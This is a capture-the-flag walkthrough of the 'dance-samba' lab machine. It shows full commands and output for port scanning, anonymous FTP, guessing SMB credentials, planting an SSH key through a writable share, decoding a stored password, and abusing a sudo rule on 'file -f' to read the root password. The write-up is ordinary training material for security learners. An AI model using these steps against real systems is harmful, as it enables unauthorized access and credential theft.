![Screenshot](/medium/dance-samba/Images/machine.png)

Difficulty: **medium**

Made by: **d1se0**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

First of all we make sure the machine is up, we can do it with the command **ping**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dancesamba]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.105 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.147 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.082 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2051ms
rtt min/avg/max/mdev = 0.082/0.111/0.147/0.026 ms
```

Now we can start the **reconnaissance** phase.

---
# Reconnaissance

We start out reconnaissance always with **nmap** to know what ports are open to the target.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dancesamba]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 21:31 -05
Initiating ARP Ping Scan at 21:31
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 21:31, 0.11s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:31
Scanning 172.17.0.2 [65535 ports]
Discovered open port 139/tcp on 172.17.0.2
Discovered open port 21/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 445/tcp on 172.17.0.2
Completed SYN Stealth Scan at 21:31, 3.10s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000024s latency).
Scanned at 2025-11-11 21:31:11 -05 for 3s
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 64
22/tcp  open  ssh          syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.45 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

When the scan concludes we can see 4 ports open:

- port 21 (ftp / file transfer protocol)
- port 22 (ssh / secure shell)
- port 139 (samba)
- port 445 (samba)

We can do another nmap scan to know more about this ports like his versions and more.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dancesamba]
└─$ nmap -p21,22,139,445 -sCV 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 21:33 -05
Nmap scan report for cinema.dl (172.17.0.2)
Host is up (0.000069s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:4e:66:7d:e5:2e:cf:df:54:39:b2:08:a9:97:79:21 (ECDSA)
|_  256 92:bf:d3:b8:20:ac:76:08:5b:93:d7:69:ef:e7:59:e1 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-12T02:33:36
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.36 seconds
```

**-p21,22,139,445** <- With this argument nmap will only scan this 3 ports that we type.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

When the scan finish we can notice something interesting, we can login on the port 21 (ftp) as **anonymous**, this means we don't need a user or a password to login to this port.

Then let's see what is inside of this port, nmap show us before a txt file.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dancesamba]
└─$ ftp 172.17.0.2 -a
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

**-a** <- With this argument we directly login as anonymous on ftp.

Let's see what is inside.

```
ftp> ls
229 Entering Extended Passive Mode (|||14876|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
226 Directory send OK.
```

There is a txt file, it seems a note, let's download the file with the command **get**.

```
ftp> get nota.txt
local: nota.txt remote: nota.txt
229 Entering Extended Passive Mode (|||51072|)
150 Opening BINARY mode data connection for nota.txt (69 bytes).
100% |***********************************************************************|    69      319.34 KiB/s    00:00 ETA
226 Transfer complete.
69 bytes received in 00:00 (77.09 KiB/s)
```

Now let's take a look the content of the file.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dancesamba]
└─$ cat nota.txt 

I don't know what to do with Macarena, she's obsessed with donald.
```

This is a hint, it seems there is a user **macarena** and also another one that is **donald***.

We can try to login with this users, let's try if we can login through smb with macarena:donald

let's see first what contents are inside of smb, we can do this first with **smbmap** that can do this job for us.

---
# Exploitation

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dancesamba]
└─$ smbmap -H 172.17.0.2   

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                                      [*] Detected 1 hosts serving SMB
[|] Initializing hosts...                                                                                           [/] Established 1 SMB connections(s) and 0 authenticated session(s)
[/] Authenticating...                                                                                                                                                                                              
[+] IP: 172.17.0.2:445  Name: cinema.dl                 Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        macarena                                                NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (71fa37bbee4f server (Samba, Ubuntu))
```


We seem a directory macarena, let's login with **smbclient**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dancesamba]
└─$ smbclient \\\\172.17.0.2\\macarena -U macarena
Password for [WORKGROUP\macarena]:
Try "help" to get a list of possible commands.
smb: \>
```

And it works! the password of the user **macarena** is **donald**! 

Let's see what it's inside of it.

```
smb: \> ls
  .                                   D        0  Mon Aug 19 12:26:02 2024
  ..                                  D        0  Mon Aug 19 12:26:02 2024
  .bash_logout                        H      220  Mon Aug 19 11:18:51 2024
  user.txt                            N       33  Mon Aug 19 11:20:25 2024
  .bash_history                       H        5  Mon Aug 19 12:26:02 2024
  .cache                             DH        0  Mon Aug 19 11:40:39 2024
  .profile                            H      807  Mon Aug 19 11:18:51 2024
  .bashrc                             H     3771  Mon Aug 19 11:18:51 2024

                475087880 blocks of size 1024. 334362064 blocks availabl
```

We got the flag here, but this is interesting, because this means that we are in the home directory of the user **macarena**.

Also remember before the port 22 is open, we can try to make a key of the user macarena to try to login in without having a password.

Then first of all, in our attack machine we generate a key with **ssh-keygen**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dancesamba]
└─$ ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/craft/.ssh/id_ed25519): id_rsa
Enter passphrase for "id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:ofB4mAasL4V8O3NNYBWcp0k1gerz96ohN62WtinQvQo craft@kali
The key's randomart image is:
+--[ED25519 256]--+
|      .o=+.      |
| .    .= ..      |
|  o .oo =        |
|.o ..B.+ .       |
|o...B =.S        |
| o.o.=o..        |
|. .E.oo=o.       |
| .  =.o*=.       |
|     .==+.o.     |
+----[SHA256]-----+

```

I save the key as **id_rsa**, and I not provided a passphrase.

And also we enter the next command to make the key be valid with the user **macarena**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dancesamba]
└─$ ssh-keygen -y -f id_rsa > id_rsa.pub
```

**-y** <- With this argument read the private key (id_rsa) and output it's corresponding public key.

**-f** <- With this argument we specify the file to read.

And this does makes possible our private key to be valid.

Also we put a permission to our private key (id_rsa)

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dancesamba]
└─$ chmod 400 id_rsa
```

Now with this we login again with the user **macarena** through **smbclient**.

Now we are making a directory **.ssh**

```
smb: \> mkdir .ssh
```

Now we enter the directory .ssh

 ```
 smb: \> cd .ssh
 ```

Now we put the key we made in our attack machine in the directory .ssh of the user **macarena**.

```
smb: \.ssh\> put id_rsa.pub authorized_keys
putting file id_rsa.pub as \.ssh\authorized_keys (15.0 kB/s) (average 15.0 kB/s)
```

Now in our attack machine we can login as the user **macarena** through **ssh**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dancesamba]
└─$ ssh -i id_rsa macarena@172.17.0.2
```

Now we execute the command and let's see if this works.

And we are the user **macarena**!

After a little bit of enumeration we found a directory **secret**

```
macarena@eb428b07ee23:/home/secret$ ls
hash
```

Let's take a look what's inside of the content.

```
macarena@eb428b07ee23:/home/secret$ cat hash 
MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===
```

The output it seems encoded in **base32**, we can try to decode it.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dancesamba]
└─$ echo "MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===" | base32 -d
c3VwZXJzZWN1cmVwYXNzd29yZA==
```

Also this output is encoded, but in **base64**, let's decode it.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dancesamba]
└─$ echo "MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===" | base32 -d | base64 -d
supersecurepassword
```

The output it seems the password of the user **macarena**. Let's try if it works.

---
# Privilege Escalation

```
macarena@eb428b07ee23:/home/secret$ sudo -l
[sudo] password for macarena: 
Matching Defaults entries for macarena on eb428b07ee23:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User macarena may run the following commands on eb428b07ee23:
    (ALL : ALL) /usr/bin/file
```

It seems we can try to read any file as any user, like the user root.

This command doesn't help to much, but a little bit more of enumeration we found this file on the **/opt/** directory.

```
macarena@eb428b07ee23:/opt$ ls -la
total 12
drwxr-xr-x 1 root root 4096 Aug 19  2024 .
drwxr-xr-x 1 root root 4096 Nov 13 22:27 ..
-rw------- 1 root root   16 Aug 19  2024 password.txt
```

Only the user root, can only write and read the content of the txt file, but we got a binary that allow us to read the content of this file as the user root.

```
macarena@eb428b07ee23:/opt$ sudo file -f password.txt 
root:rooteable2: cannot open `root:rooteable2' (No such file or directory)
```

It seems the password of the user root let's try it.

```
macarena@eb428b07ee23:/opt$ su root
Password: 
root@eb428b07ee23:/opt# whoami
root
```

Now we are root ***....Pwned...!***
